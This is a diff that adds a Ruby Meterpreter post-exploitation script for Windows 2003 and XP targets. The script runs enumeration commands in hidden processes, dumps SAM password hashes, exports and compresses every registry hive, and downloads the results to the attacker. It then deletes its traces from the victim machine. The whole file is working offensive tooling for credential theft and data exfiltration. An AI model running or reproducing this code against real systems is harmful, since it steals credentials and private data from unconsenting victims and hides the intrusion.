@@ -1,0 +1,116 @@
+Meterpreter script for basic enumeration of Windows 2003 and Windows XP targets
+
+ #!/usr/bin/env ruby
+#
+#Meterpreter script for basic enumeration of Windows 2003 and Windows XP targets
+#using native windows commands.
+#Provided by Carlos Perez at carlos_perez[at]darkoperator.com
+#Verion: 0.1
+#
+v = $VERBOSE
+$VERBOSE = nil
+session = client
+# Extract the host and port
+host,port = session.tunnel_peer.split(':')
+print_status("Running Windows Local Enumerion Meterpreter Script by Darkoperator")
+print_status("New session on #{host}:#{port}...")
+dst = Rex::Text.rand_text_alpha_upper(5) + ".txt"
+dest = "/tmp/"+host + "_" + Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000))
+#Generating List of Commands
+cmd = [
+    'set',
+    'arp -a',
+    'ipconfig /all',
+    'ipconfig /displaydns',
+    'route print',
+    'net view',
+    'netstat -na',
+    'netstat -ns',
+    'net share',
+    'net view',
+    'net group',
+    'net user',
+    'net localgroup',
+    'net view /domain',
+    'netsh firewall show config',
+]    
+wmic = [
+    'computersystem list',
+    'useraccount list',
+    'group',
+    'service list brief',
+    'volume list brief',
+    'process list brief',
+    'startup list full',
+    'qfe',
+]
+
+#Executing Commands
+#
+cmd.each do |exec|
+    sleep(1)
+    puts "[*] Executing: #{exec}"
+    client.sys.process.execute("cmd.exe /c echo **************************** >> %SystemDrive%\\#{dst}",nil, {'Hidden' => 'true'})
+    client.sys.process.execute("cmd.exe /c echo \"Output of #{exec}\" >> %SystemDrive%\\#{dst}",nil, {'Hidden' => 'true'})
+    client.sys.process.execute("cmd.exe /c echo **************************** >> %SystemDrive%\\#{dst}",nil, {'Hidden' => 'true'})
+    client.sys.process.execute("cmd.exe /c #{exec} >> %SystemDrive%\\#{dst}",nil, {'Hidden' => 'true'})
+end
+#wmic commands have to be ran separetly since piping gave me problems with the formating of the data and killed the meterpreter session
+wmic.each do |exec|
+    sleep(1)
+    puts "[*] Executing: wmic #{exec}"
+    client.sys.process.execute("cmd.exe /c echo **************************** >> %SystemDrive%\\#{dst}",nil, {'Hidden' => 'true'})
+    client.sys.process.execute("cmd.exe /c echo \"Output of wmic #{exec}\" >> %SystemDrive%\\#{dst}",nil, {'Hidden' => 'true'})
+    client.sys.process.execute("cmd.exe /c echo **************************** >> %SystemDrive%\\#{dst}",nil, {'Hidden' => 'true'})
+    client.sys.process.execute("cmd.exe /c wmic /append:c:\\#{dst} #{exec}",nil, {'Hidden' => 'true'})
+end
+
+sleep(3)
+
+print_status("Downloading #{dst} to -> #{dest}")
+client.fs.file.download_file("#{dest}", "%SystemDrive%\\#{dst}")
+
+#Dumping Password hashes and appending them to downloaded file from the target
+
+begin
+    client.core.use("priv")
+    hashes = session.priv.sam_hashes
+    print_status("Dumping password hashes...")
+    output = Class::File.open("#{dest}", "a")
+    output.puts("****************************")
+    output.puts("Dumped Password Hashes")
+    output.puts("****************************\n\n")
+    hashes.each do |h|
+        output.puts(h)
+    end
+    output.close
+rescue ::Exception => e
+    print_status("Error dumping hashes: #{e.class} #{e}")
+end
+
+#Dumping the Registry of the target machine
+
+hives = %w{HKCU HKLM HKCC HKCR HKU}
+hives.each do |hive|
+    print_status("Exporting #{hive}")
+    client.sys.process.execute("cmd.exe /c reg.exe export #{hive} %SystemDrive%\\#{hive}", nil, {'Hidden' => 'true'})
+    #Give enough time for the Hive to be exported
+    sleep(5)
+    print_status("Compressing #{hive} into cab file for faster download")
+    client.sys.process.execute("cmd.exe /c makecab %SystemDrive%\\#{hive} %SystemDrive%\\#{hive}.cab", nil, {'Hidden' => 'true'})
+    #Give enough time for the Hive to be compress sin they can be from 2MB to 40MB in size
+    sleep(5)
+end
+hives.each do |hive|
+    print_status("Downloading #{hive}.cab to -> #{dest}-#{hive}")
+    client.fs.file.download_file("#{dest}-#{hive}.cab", "%SystemDrive%\\#{hive}.cab")
+    sleep(5)
+end
+        
+
+#Cleanning up any files left behind
+print_status("Removing anything we left behind...")
+client.sys.process.execute("cmd.exe /c del %SystemDrive%\\#{dst}", nil, {'Hidden' => 'true'})
+client.sys.process.execute("cmd.exe /c del %SystemDrive%\\HK*", nil, {'Hidden' => 'true'})
+
+print_status("Done!")
